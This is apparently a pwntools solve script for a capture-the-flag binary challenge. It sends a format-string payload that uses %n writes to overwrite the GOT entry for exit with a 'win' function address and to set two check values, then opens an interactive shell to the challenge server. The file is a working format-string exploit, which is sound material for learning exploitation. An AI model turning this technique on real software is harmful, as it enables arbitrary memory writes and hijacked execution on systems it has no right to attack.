#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rvcechalls.xyz", 32855)

    return r


def main():
    r = conn()

    #input is at %8$x
    # blank1 addr = 0x00404050 == 0xc0de
    # blank2 addr = 0x00404054 == 0xcafe

    #debugging we print 40 bytes and then point it at 0x404050
    # payload = b"%49374X%11$n" + b"%2592X%12$nA" + p64(0x00404050) + p64(0x404054)
    ## this is enough to pass the first check

    gotEx = 0x0404038

    r.recv()
    # got address of EXIT is 0x404038
    # win address is 00401247
    # i have to write 0x40 at win+2 bytes
    # i have to write 0x4038 at win 

    payload = b""
    # total bytes in stack  = 9 + 12 + 12 + 11 = 44 : padding = 4A first one is 8th , so we have to start at 14
    payload += b"%64X%14$n" + b"%4615X%15$hn" + b"%44695X%16$n" + b"%2592X%17$nAAAA" + p64(gotEx+2) + p64(gotEx) + p64(0x00404050) + p64(0x404054)

    r.sendline(payload)
    print(hex(exe.got['exit']))
    with open("payload", "wb") as file:
        file.write(payload)
    r.recv()
    r.interactive()


if __name__ == "__main__":
    main()
